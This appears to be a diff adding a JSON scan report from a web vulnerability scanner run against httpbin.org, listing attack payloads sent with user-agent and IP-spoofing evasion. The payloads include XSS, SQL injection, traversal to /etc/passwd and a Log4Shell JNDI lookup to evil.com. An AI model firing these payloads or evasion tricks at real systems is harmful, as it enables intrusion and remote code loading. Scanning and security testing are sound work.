@@ -1,0 +1,162 @@
+[
+  {
+    "target": "https://httpbin.org",
+    "cms_type": null,
+    "scan_timestamp": "2025-08-11 04:19:28",
+    "vulnerabilities": [],
+    "hidden_urls": [
+      {
+        "url": "https://httpbin.org/robots.txt",
+        "status": 200,
+        "size": 30
+      }
+    ],
+    "admin_panels": [],
+    "waf_bypass_attempts": [
+      {
+        "payload": "<script>alert('XSS')</script>",
+        "technique": "Standard",
+        "status": "Response: 200",
+        "url": "https://httpbin.org?search=<script>alert('XSS')</script>"
+      },
+      {
+        "payload": "<script>alert('XSS')</script>",
+        "technique": "Random UA",
+        "status": "Response: 200",
+        "url": "https://httpbin.org?search=<script>alert('XSS')</script>"
+      },
+      {
+        "payload": "<script>alert('XSS')</script>",
+        "technique": "IP Spoofing",
+        "status": "Response: 200",
+        "url": "https://httpbin.org?search=<script>alert('XSS')</script>"
+      },
+      {
+        "payload": "<script>alert('XSS')</script>",
+        "technique": "Mobile UA",
+        "status": "Response: 200",
+        "url": "https://httpbin.org?search=<script>alert('XSS')</script>"
+      },
+      {
+        "payload": "' OR 1=1--",
+        "technique": "Standard",
+        "status": "Response: 200",
+        "url": "https://httpbin.org?search=' OR 1=1--"
+      },
+      {
+        "payload": "' OR 1=1--",
+        "technique": "Random UA",
+        "status": "Response: 200",
+        "url": "https://httpbin.org?search=' OR 1=1--"
+      },
+      {
+        "payload": "' OR 1=1--",
+        "technique": "IP Spoofing",
+        "status": "Response: 200",
+        "url": "https://httpbin.org?search=' OR 1=1--"
+      },
+      {
+        "payload": "' OR 1=1--",
+        "technique": "Mobile UA",
+        "status": "Response: 200",
+        "url": "https://httpbin.org?search=' OR 1=1--"
+      },
+      {
+        "payload": "../../../etc/passwd",
+        "technique": "Standard",
+        "status": "Response: 200",
+        "url": "https://httpbin.org?search=../../../etc/passwd"
+      },
+      {
+        "payload": "../../../etc/passwd",
+        "technique": "Random UA",
+        "status": "Response: 200",
+        "url": "https://httpbin.org?search=../../../etc/passwd"
+      },
+      {
+        "payload": "../../../etc/passwd",
+        "technique": "IP Spoofing",
+        "status": "Response: 200",
+        "url": "https://httpbin.org?search=../../../etc/passwd"
+      },
+      {
+        "payload": "../../../etc/passwd",
+        "technique": "Mobile UA",
+        "status": "Response: 200",
+        "url": "https://httpbin.org?search=../../../etc/passwd"
+      },
+      {
+        "payload": "<img src=x onerror=alert(1)>",
+        "technique": "Standard",
+        "status": "Response: 200",
+        "url": "https://httpbin.org?search=<img src=x onerror=alert(1)>"
+      },
+      {
+        "payload": "<img src=x onerror=alert(1)>",
+        "technique": "Random UA",
+        "status": "Response: 200",
+        "url": "https://httpbin.org?search=<img src=x onerror=alert(1)>"
+      },
+      {
+        "payload": "<img src=x onerror=alert(1)>",
+        "technique": "IP Spoofing",
+        "status": "Response: 200",
+        "url": "https://httpbin.org?search=<img src=x onerror=alert(1)>"
+      },
+      {
+        "payload": "<img src=x onerror=alert(1)>",
+        "technique": "Mobile UA",
+        "status": "Response: 200",
+        "url": "https://httpbin.org?search=<img src=x onerror=alert(1)>"
+      },
+      {
+        "payload": "${jndi:ldap://evil.com/a}",
+        "technique": "Standard",
+        "status": "Response: 200",
+        "url": "https://httpbin.org?search=${jndi:ldap://evil.com/a}"
+      },
+      {
+        "payload": "${jndi:ldap://evil.com/a}",
+        "technique": "Random UA",
+        "status": "Response: 200",
+        "url": "https://httpbin.org?search=${jndi:ldap://evil.com/a}"
+      },
+      {
+        "payload": "${jndi:ldap://evil.com/a}",
+        "technique": "IP Spoofing",
+        "status": "Response: 200",
+        "url": "https://httpbin.org?search=${jndi:ldap://evil.com/a}"
+      },
+      {
+        "payload": "${jndi:ldap://evil.com/a}",
+        "technique": "Mobile UA",
+        "status": "Response: 200",
+        "url": "https://httpbin.org?search=${jndi:ldap://evil.com/a}"
+      },
+      {
+        "payload": "<svg onload=alert(1)>",
+        "technique": "Standard",
+        "status": "Response: 200",
+        "url": "https://httpbin.org?search=<svg onload=alert(1)>"
+      },
+      {
+        "payload": "<svg onload=alert(1)>",
+        "technique": "Random UA",
+        "status": "Response: 200",
+        "url": "https://httpbin.org?search=<svg onload=alert(1)>"
+      },
+      {
+        "payload": "<svg onload=alert(1)>",
+        "technique": "IP Spoofing",
+        "status": "Response: 200",
+        "url": "https://httpbin.org?search=<svg onload=alert(1)>"
+      },
+      {
+        "payload": "<svg onload=alert(1)>",
+        "technique": "Mobile UA",
+        "status": "Response: 200",
+        "url": "https://httpbin.org?search=<svg onload=alert(1)>"
+      }
+    ]
+  }
+]
